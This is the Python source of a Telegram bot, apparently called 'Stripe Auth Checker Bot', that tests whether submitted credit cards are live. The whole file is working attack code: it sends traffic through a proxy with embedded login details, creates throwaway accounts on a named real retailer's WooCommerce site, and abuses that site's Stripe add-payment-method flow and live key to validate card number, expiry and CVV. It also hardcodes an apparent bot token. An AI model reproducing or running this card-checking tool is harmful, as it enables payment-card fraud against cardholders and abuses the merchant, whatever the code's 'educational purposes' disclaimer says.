import aiohttp
import asyncio
import random
import string
from datetime import datetime
from aiohttp_socks import ProxyConnector
import os
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot configuration
BOT_TOKEN = os.getenv('BOT_TOKEN', '8411567693:AAE7Yqpy4u9YZqL5DT3-hb0NZgLqTfnFEL0')

# Proxy configuration
PROXY_URL = "socks5://89565483-zone-custom:M5o5HIxR@na.proxys5.net:6200"

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

def generate_random_email():
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "aol.com"]
    letters = string.ascii_lowercase
    username = "".join(random.choice(letters) for i in range(10))
    domain = random.choice(domains)
    return f"{username}@{domain}"

async def get_bin_details(cc_number):
    """Fetch BIN details from AntiPublic API"""
    bin_number = cc_number[:6]
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    
    try:
        # Use proxy for BIN lookup too
        connector = ProxyConnector.from_url(PROXY_URL)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(url, timeout=10) as response:
                if response.status == 200:
                    data = await response.json()
                    return data
                else:
                    logger.error(f"BIN API returned status: {response.status}")
                    return None
    except Exception as e:
        logger.error(f"BIN API error: {e}")
        return None

async def make_request(session, url, method="POST", headers=None, data=None, json=None, max_retries=3):
    for attempt in range(max_retries):
        try:
            timeout = aiohttp.ClientTimeout(total=30)
            async with session.request(method, url, headers=headers, data=data, json=json, timeout=timeout) as response:
                text = await response.text()
                logger.info(f"Request {method} {url} - Status: {response.status}")
                return text, response.status
        except Exception as e:
            logger.error(f"Request error (attempt {attempt + 1}/{max_retries}): {e}")
            if attempt == max_retries - 1:
                return None, 0
            await asyncio.sleep(2)
    return None, 0

async def process_cc_check(card_data, user_info=""):
    """Process a single credit card check"""
    try:
        cc, mon, year, cvv = card_data.split('|')[:4]
        year = year[-2:] if len(year) == 4 else year
        
        logger.info(f"Processing card: {cc}|{mon}|{year}|{cvv} for user: {user_info}")

        # Proxy configuration - FIXED
        connector = ProxyConnector.from_url(PROXY_URL)

        async with aiohttp.ClientSession(connector=connector, trust_env=True) as session:
            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "en-US,en;q=0.9",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            }

            # Step 1: Get account page
            req, status = await make_request(
                session,
                url="https://www.georgedaviesturf.co.uk/my-account",
                method="GET",
                headers=headers,
            )
            
            if req is None or status != 200:
                return "❌ Failed to connect to website"
            
            nonce = parseX(req, 'name="woocommerce-register-nonce" value="', '"')
            if nonce == "None":
                return "❌ Could not access the payment gateway"
            
            await asyncio.sleep(1)

            # Step 2: Register account
            headers2 = headers.copy()
            headers2.update({
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.georgedaviesturf.co.uk",
                "referer": "https://www.georgedaviesturf.co.uk/my-account",
            })
            
            random_email = generate_random_email()
            data2 = {
                "email": random_email,
                "woocommerce-register-nonce": nonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register",
            }

            req2, status2 = await make_request(
                session,
                "https://www.georgedaviesturf.co.uk/my-account/",
                headers=headers2,
                data=data2,
            )
            
            if req2 is None or status2 != 200:
                return "❌ Failed to register account"
            
            await asyncio.sleep(1)

            # Step 3: Get payment method page
            req3, status3 = await make_request(
                session,
                url="https://www.georgedaviesturf.co.uk/my-account/add-payment-method/",
                method="GET",
                headers=headers,
            )
            
            if req3 is None or status3 != 200:
                return "❌ Failed to load payment page"
            
            await asyncio.sleep(2)
            
            rest_nonce = parseX(req3, '"createAndConfirmSetupIntentNonce":"', '"')
            if rest_nonce == "None":
                return "❌ Payment gateway error"

            # Step 4: Create payment method with Stripe
            headers4 = {
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            }

            form_data4 = {
                "type": "card",
                "card[number]": cc,
                "card[cvc]": cvv,
                "card[exp_year]": year,
                "card[exp_month]": mon,
                "billing_details[address][postal_code]": "10001",
                "billing_details[address][country]": "US",
                "key": "pk_live_51OCKXEAPMeRp4YIca4hWzwyYQnAllzcTDlBQ76zKfkErhZEyh5aOPCLixfOnAt1oV31EfTX2CGTu40JVnrLvQL7r0078s5MPx5",
            }
            
            req4, status4 = await make_request(
                session,
                url="https://api.stripe.com/v1/payment_methods",
                headers=headers4,
                data=form_data4,
            )
            
            if req4 is None:
                return "❌ Failed to create payment method"
            
            pmid = parseX(req4, '"id": "', '"')
            if pmid == "None":
                error_msg = parseX(req4, '"message": "', '"')
                if error_msg != "None":
                    return f"❌ Stripe: {error_msg}"
                return "❌ Invalid card details"

            # Step 5: Confirm setup intent
            headers5 = {
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.georgedaviesturf.co.uk",
                "referer": "https://www.georgedaviesturf.co.uk/my-account/add-payment-method",
                "x-requested-with": "XMLHttpRequest",
            }
            
            data5 = {
                "action": "wc_stripe_create_and_confirm_setup_intent",
                "wc-stripe-payment-method": pmid,
                "wc-stripe-payment-type": "card",
                "_ajax_nonce": rest_nonce,
            }
            
            req5, status5 = await make_request(
                session,
                url="https://www.georgedaviesturf.co.uk/wp-admin/admin-ajax.php",
                headers=headers5,
                data=data5,
            )

            if req5 is None:
                return "❌ Failed to process payment"

            # FIXED: Proper JSON parsing to avoid 'str' object has no attribute 'get' error
            try:
                import json
                response_data = json.loads(req5)
                if isinstance(response_data, dict):
                    if response_data.get('success') and 'succeeded' in str(response_data):
                        # Get BIN details
                        bin_details = await get_bin_details(cc)
                        if bin_details and 'bin' in bin_details:
                            bin_info = bin_details['bin']
                            bank = bin_info.get('bank', {}).get('name', 'Unknown')
                            country = bin_info.get('country', {}).get('name', 'Unknown')
                            brand = bin_info.get('brand', 'Unknown')
                            
                            return f"""✅ **APPROVED** 
💳 Card: `{cc}|{mon}|{year}|{cvv}`
🏦 Bank: {bank}
🇺🇳 Country: {country}
🔤 Brand: {brand}
💾 Status: Live Card ✅"""
                        else:
                            return f"✅ **APPROVED** - Card is Live!\n`{cc}|{mon}|{year}|{cvv}`"
                    elif 'requires_action' in str(response_data):
                        return "⚠️ **3DS REQUIRED** - Card requires additional authentication"
                    else:
                        error_msg = response_data.get('message', 'Card declined')
                        return f"❌ **DECLINED** - {error_msg}"
                else:
                    # Handle string response
                    if "succeeded" in req5:
                        bin_details = await get_bin_details(cc)
                        if bin_details and 'bin' in bin_details:
                            bin_info = bin_details['bin']
                            bank = bin_info.get('bank', {}).get('name', 'Unknown')
                            country = bin_info.get('country', {}).get('name', 'Unknown')
                            return f"✅ **APPROVED** - {bank} ({country})\n`{cc}|{mon}|{year}|{cvv}`"
                        return f"✅ **APPROVED** - Card is Live!\n`{cc}|{mon}|{year}|{cvv}`"
                    elif "requires_action" in req5:
                        return "⚠️ **3DS REQUIRED** - Card requires additional authentication"
                    elif "error" in req5:
                        error_resp = parseX(req5, '"message":"', '"')
                        return f"❌ **DECLINED** - {error_resp if error_resp != 'None' else 'Card declined'}"
                    else:
                        return "❌ **FAILED** - Unable to process card"
            except json.JSONDecodeError:
                # If not JSON, handle as string
                if "succeeded" in req5:
                    return f"✅ **APPROVED** - Card is Live!\n`{cc}|{mon}|{year}|{cvv}`"
                elif "requires_action" in req5:
                    return "⚠️ **3DS REQUIRED** - Card requires additional authentication"
                else:
                    return "❌ **DECLINED** - Card not accepted"

    except Exception as e:
        logger.error(f"Processing error: {e}")
        return f"❌ Processing error: {str(e)}"

def validate_cc_format(cc_text):
    """Validate CC format"""
    try:
        parts = cc_text.split('|')
        if len(parts) < 4:
            return False
        
        cc, mon, year, cvv = parts[:4]
        
        if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
            return False
        if not mon.isdigit() or not (1 <= int(mon) <= 12):
            return False
        if not year.isdigit() or len(year) not in [2, 4]:
            return False
        if not cvv.isdigit() or len(cvv) not in [3, 4]:
            return False
            
        return True
    except:
        return False

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    welcome_text = """
🤖 **Stripe Auth Checker Bot**

Send me a credit card in the format:
`cc_number|mm|yyyy|cvv`

Example:
`4111111111111111|12|2025|123`

I'll check the card against Stripe Auth and show you the results.

🔒 *For educational purposes only*
    """
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle CC messages"""
    try:
        user_id = update.effective_user.id
        message_text = update.message.text
        
        if not validate_cc_format(message_text):
            await update.message.reply_text(
                "❌ **Invalid Format**\n\nPlease send CC in format:\n`cc_number|mm|yyyy|cvv`\n\nExample: `4111111111111111|12|2025|123`",
                parse_mode='Markdown'
            )
            return
        
        # Send processing message
        processing_msg = await update.message.reply_text("🔄 Processing your card...")
        
        # Process the card
        user_info = f"@{update.effective_user.username}" if update.effective_user.username else f"UserID: {user_id}"
        result = await process_cc_check(message_text, user_info)
        
        # Update the message with result
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=processing_msg.message_id,
            text=result,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Message handling error: {e}")
        await update.message.reply_text("❌ An error occurred while processing your card.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    logger.error(f"Error: {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text("❌ An error occurred. Please try again later.")

def main():
    """Start the bot"""
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        logger.error("❌ Please set BOT_TOKEN environment variable")
        return
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cc_message))
    application.add_error_handler(error_handler)
    
    # Start the bot
    logger.info("🤖 Bot is starting with proxy...")
    application.run_polling()

if __name__ == "__main__":
    main()
